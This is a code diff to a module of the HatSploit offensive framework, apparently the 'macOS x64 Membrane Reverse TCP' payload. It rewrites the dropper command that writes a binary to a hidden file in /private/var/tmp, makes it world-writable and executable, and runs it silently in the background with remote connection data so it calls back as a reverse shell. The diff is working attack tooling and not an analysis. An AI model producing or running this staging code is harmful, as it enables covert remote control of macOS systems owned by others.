@@ -28,7 +28,11 @@ import base64
 
 from core.lib.payload import HatSploitPayload
 
+from utils.tcp.tcp import tcp
+
 class HatSploitPayload(HatSploitPayload):
+    tcp = tcp()
+
     details = {
         'Name': "macOS x64 Membrane Reverse TCP",
         'Payload': "macos/x64/membrane_reverse_tcp",
@@ -65,9 +69,10 @@ class HatSploitPayload(HatSploitPayload):
         binary.close()
 
         execute = ""
-        execute += f"cat {payload} > /private/var/tmp/.payload;"
+        execute += f"cat >/private/var/tmp/.payload;"
         execute += f"chmod 777 /private/var/tmp/.payload;"
         execute += f"sh -c '/private/var/tmp/.payload {remote_data}' 2>/dev/null &"
+        execute += "\n"
 
         self.data['payload'] = payload
         self.data['execute'] = execute
